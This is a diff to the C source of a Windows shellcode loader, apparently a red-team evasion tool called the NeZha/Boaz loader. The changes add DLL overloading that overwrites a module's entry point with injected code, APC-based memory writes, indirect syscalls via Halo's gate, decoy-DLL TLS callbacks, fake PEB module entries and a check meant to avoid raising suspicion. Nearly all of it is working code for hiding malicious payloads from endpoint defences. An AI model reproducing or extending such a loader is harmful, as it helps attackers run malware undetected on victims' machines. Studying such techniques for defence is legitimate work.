@@ -1,12 +1,13 @@
 /****
  * Stealth NeZha loader: a APC write method with DLL overloading
- * a PoC only, no DLL searching or error handling
+ * Local injection loader for 64-bit processes on Windows 11
+ * For remote loader, you would need to perform relocation and fix imports
  * Add syscall for create thread
  * Add dynamic loading for NT functions resolved by CRC
- * TODO: Add indirect syscall with Halo's gate method to replace NT functions used. 
+ * Add indirect syscall with Halo's gate method to replace NT functions used. 
  * Author: Thomas X Meng
  * Modified version of loader 32, add decoy library, 
- * CreateThread pointed to a memory address of UNMODIFIED DLL. 
+ * TLS callback to decoy DLL.
  * 
 */
 #include <windows.h>
@@ -16,6 +17,7 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <ctype.h>
+#include <heapapi.h>
 
 
 typedef BOOL (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
@@ -106,7 +108,7 @@ typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void
 //     ULONG NewAccessProtection,
 //     PULONG OldAccessProtection);
 
-/////////////////////////// Change state, TODO:  
+/////////////////////////// Change state,
 
 // typedef enum _PROCESS_STATE_CHANGE_TYPE {
 //     ThreadStateChangeSuspend,
@@ -500,7 +502,7 @@ BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BO
                 // swprintf_s(fullPath, MAX_PATH, L"%s\\%s", systemDir, findData.cFileName);
                 wcsncpy_s(dllPath, bufferSize, fullPath, _TRUNCATE);
                 FindClose(hFind);
-                // TODO:enable the function below if you want to see the statistics of the dll you are going to use:
+                // enable the function below if you want to see the statistics of the dll you are going to use:
                 // PrintSectionDetails(fullPath);
                 return TRUE; // Found the DLL in the specified order
             }
@@ -782,7 +784,7 @@ DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD 
     }
 
 
-    // TODO: Change state:
+    // Change state:
     // HANDLE ThreadStateChangeHandle = NULL;
     // HANDLE duplicateThreadHandle = NULL;
 
@@ -839,7 +841,7 @@ DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD 
         // }
         // Ex:
         NTSTATUS result = pNtQueueApcThread(
-        hThread, // ThreadHandle remains the same
+        hThread, // ThreadHandle remains the same. //for remote thread, you can openthread first.
         NULL, // UserApcReserveHandle is not used in the original call, so pass NULL
         apcFlags, // Whatever you like 
         pRtlFillMemory, // ApcRoutine remains the same
@@ -988,13 +990,45 @@ DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD 
 }
 
 
+//// TODO: Add PEB module: 
+typedef struct _PEB_LDR_DATA_FREE {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    PVOID EntryInProgress;
+    BOOLEAN ShutdownInProgress;
+    HANDLE ShutdownThreadId;
+} PEB_LDR_DATA_FREE, *PPEB_LDR_DATA_FREE;
+
+// Define a custom LDR_DATA_TABLE_ENTRY structure based on the provided definition
+typedef struct _MY_LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
+void AddModuleToPEB(HMODULE hModule, LPCWSTR lpwModuleName);
+void PrintPEBList(PLIST_ENTRY ListHead);
+void VerifyModuleInPEB(PPEB_LDR_DATA_FREE ldr, LPCWSTR moduleName);
+
+
+
+
+/////////////TODO: 
 ////////////////////////////////////////
 
 unsigned char magiccode[] = ####SHELLCODE####;
 
 int main(int argc, char *argv[])
 {
-    // printf("Starting program...\n");
+    printf("[*] Starting Boaz NZ custom loader...\n");
 
     // printf("[+] MagicCode size: %lu bytes\n", sizeof(magiccodeNot));
     // //print the first few and last few bytes of magiccodeNot for verifiation:
@@ -1157,6 +1191,10 @@ int main(int argc, char *argv[])
     }
 
     wprintf(L"[+] Using DLL: %ls\n", dllPath);
+    if(GetModuleHandleW(dllPath) != NULL) {
+        printf("[!] DLL chosen already loaded in the process. It might raise suspicion.\n");
+        return 0;
+    }
     wprintf(L"[+] TxF Mode: %ls\n", bTxF ? L"Enabled" : L"Disabled");
 
     /// deal with TxF argument
@@ -1220,9 +1258,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
-    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
-    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
+
 
 
    //TODO: delete: 
@@ -1240,14 +1276,16 @@ int main(int argc, char *argv[])
 		printf("[+] DLL loaded.\n");
 	}
 
-    // Calculate the AddressOfEntryPoint in current process
-    // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
-	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
-    PVOID dllEntryPoint_decoy = (PVOID)(entryPointRVA + (DWORD_PTR)hDll_decoy);
-	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
-    wprintf(L"Using decoy DLL: %ls\n", dllPath_decoy);
+    // // Calculate the AddressOfEntryPoint in current process
+    // // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
+	// // printf("[+] DLL entry point: %p\n", dllEntryPoint);
+    // PVOID dllEntryPoint_decoy = (PVOID)(entryPointRVA + (DWORD_PTR)hDll_decoy);
+	// // printf("[+] DLL entry point: %p\n", dllEntryPoint);
+    // wprintf(L"Using decoy DLL: %ls\n", dllPath_decoy);
 
    //TODO: delete: 
+
+
 
     // Load the DLL to get its base address in current process
     // HMODULE hDll = LoadLibraryW(dllPath);
@@ -1261,12 +1299,14 @@ int main(int argc, char *argv[])
     } else { 
 		printf("[+] DLL loaded.\n");
 	}
-
-    // Calculate the AddressOfEntryPoint in current process
-    // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
-	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
+    //1. 
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hDll;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)hDll + dosHeader->e_lfanew);
+    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
+    // //Write to .text section
     PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)hDll);
-	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
+
+	printf("[+] DLL entry point: %p\n", dllEntryPoint);
     wprintf(L"Using DLL: %ls\n", dllPath);
 
     // Overwrite the AddressOfEntryPoint with magiccode
@@ -1388,11 +1428,39 @@ int main(int argc, char *argv[])
     // NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
     // g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_size, MEM_RELEASE);
 
-    DLLEntry DllEntry = (DLLEntry)((unsigned long long int)hDll + entryPointRVA);
 
+    // PIMAGE_TLS_CALLBACK *callback;
+    // PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    // if(tls_entry->Size) {
+    //     PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base + tls_entry->VirtualAddress);
+    //     callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
+    //     for(; *callback; callback++)
+    //         (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
+    // }
+
+    // This TLS calls our magic code first because the loading of decoy DLL is done first.
+    PIMAGE_TLS_CALLBACK *callback_decoy;
+    PIMAGE_DATA_DIRECTORY tls_entry_decoy = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    // if(tls_entry_decoy->Size) {
+    //     PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)hDll + tls_entry_decoy->VirtualAddress);
+    //     callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
+    //     for(; *callback_decoy; callback_decoy++)
+    //         (*callback_decoy)((LPVOID)hDll, DLL_PROCESS_ATTACH, NULL);
+    // }
+    if(tls_entry_decoy->Size) {
+        PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)hDll_decoy + tls_entry_decoy->VirtualAddress);
+        callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
+        for(; *callback_decoy; callback_decoy++)
+            (*callback_decoy)((LPVOID)hDll_decoy, DLL_PROCESS_ATTACH, NULL);
+    }
+
+
+
+    // Use function pointer to call the DLL entry point 2nd time.
+    DLLEntry DllEntry = (DLLEntry)((unsigned long long int)hDll + entryPointRVA);
     (*DllEntry)((HINSTANCE)hDll, DLL_PROCESS_ATTACH, 0);
-    // TODO: 
-    
+
+
     // DWORD threadID;
     // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint_decoy, NULL, 0, &threadID);
     // if (hThread == NULL) {
@@ -1405,13 +1473,20 @@ int main(int argc, char *argv[])
     //     return 1;
     // }
 
+    AddModuleToPEB(hDll, dllPath);
+    // VerifyModuleInPEB(ldr, dllPath);
+
     // //wait for thread to finish:
     // WaitForSingleObject(hThread, INFINITE);
+    printf("[+] press any key to continue\n");
+    getchar();
+
+
 
 	printf("[+] No need to create thread.\n");
 
     // CloseHandle(hThread);
-    // FreeLibrary(hDll);
+    // FreeLibrary(hDll); // Unload the DLL will cause the DLL to be executed 2nd time.
     UnmapViewOfFile(fileBase);
     // CloseHandle(fileMapping);
     // CloseHandle(fileHandle);
@@ -1467,4 +1542,89 @@ BOOL PrintSectionDetails(const wchar_t* dllPath) {
     free(fileBuffer);
     CloseHandle(hFile);
     return TRUE;
+}
+
+
+
+
+//// TODO: Add PEB module: 
+
+void InsertTailList(PLIST_ENTRY ListHead, PLIST_ENTRY Entry) {
+    PLIST_ENTRY Blink = ListHead->Blink;
+    Entry->Flink = ListHead;
+    Entry->Blink = Blink;
+    Blink->Flink = Entry;
+    ListHead->Blink = Entry;
+}
+
+void InsertModuleIntoPEBLists(PPEB_LDR_DATA_FREE ldr, PMY_LDR_DATA_TABLE_ENTRY moduleEntry) {
+    // Insert the module entry into the relevant PEB lists
+    InsertTailList(&ldr->InLoadOrderModuleList, &moduleEntry->InLoadOrderLinks);
+    InsertTailList(&ldr->InMemoryOrderModuleList, &moduleEntry->InMemoryOrderLinks);
+    InsertTailList(&ldr->InInitializationOrderModuleList, &moduleEntry->InInitializationOrderLinks);
+}
+
+void MyInitUnicodeString(PUNICODE_STRING Target, PCWSTR Source) {
+    if (!Target) return;
+
+    Target->Buffer = (PWSTR)Source;
+    Target->Length = wcslen(Source) * sizeof(WCHAR);
+    Target->MaximumLength = Target->Length + sizeof(WCHAR);
+}
+
+void PrintPEBList(PLIST_ENTRY ListHead) {
+    PLIST_ENTRY current = ListHead->Flink;
+    while (current != ListHead) {
+        PMY_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        wprintf(L"Module: %s\n", entry->FullDllName.Buffer);
+        current = current->Flink;
+    }
+}
+
+void VerifyModuleInPEB(PPEB_LDR_DATA_FREE ldr, LPCWSTR moduleName) {
+    PLIST_ENTRY current = ldr->InLoadOrderModuleList.Flink;
+    while (current != &ldr->InLoadOrderModuleList) {
+        PMY_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (wcscmp(entry->FullDllName.Buffer, moduleName) == 0) {
+            wprintf(L"Module %s found in PEB lists.\n", moduleName);
+            return;
+        }
+        current = current->Flink;
+    }
+    wprintf(L"Module %s not found in PEB lists.\n", moduleName);
+}
+
+
+void AddModuleToPEB(HMODULE hModule, LPCWSTR lpwModuleName) {
+    PPEB peb = (PPEB)__readgsqword(0x60);  // For x64
+    PPEB_LDR_DATA_FREE ldr = (PPEB_LDR_DATA_FREE)peb->Ldr;
+
+    PMY_LDR_DATA_TABLE_ENTRY moduleEntry = (PMY_LDR_DATA_TABLE_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MY_LDR_DATA_TABLE_ENTRY));
+    if (!moduleEntry) return;
+
+    // Initialize necessary fields
+    moduleEntry->DllBase = hModule;
+    
+    // Initialize UNICODE_STRINGs for FullDllName and BaseDllName
+    MyInitUnicodeString(&moduleEntry->FullDllName, lpwModuleName);
+    
+    LPCWSTR baseName = wcsrchr(lpwModuleName, L'\\') ? wcsrchr(lpwModuleName, L'\\') + 1 : lpwModuleName;
+    MyInitUnicodeString(&moduleEntry->BaseDllName, baseName);
+
+    // Calculate the entry point of the module
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dosHeader->e_lfanew);
+    moduleEntry->EntryPoint = (PVOID)((PBYTE)hModule + ntHeaders->OptionalHeader.AddressOfEntryPoint);
+    moduleEntry->SizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
+
+    // Print PEB lists before insertion
+    printf("Before insertion:\n");
+    PrintPEBList(&ldr->InLoadOrderModuleList);
+
+    // Insert the module entry into the PEB lists
+    InsertModuleIntoPEBLists(ldr, moduleEntry);
+
+    // Print PEB lists after insertion
+    printf("After insertion:\n");
+    PrintPEBList(&ldr->InLoadOrderModuleList);
 }
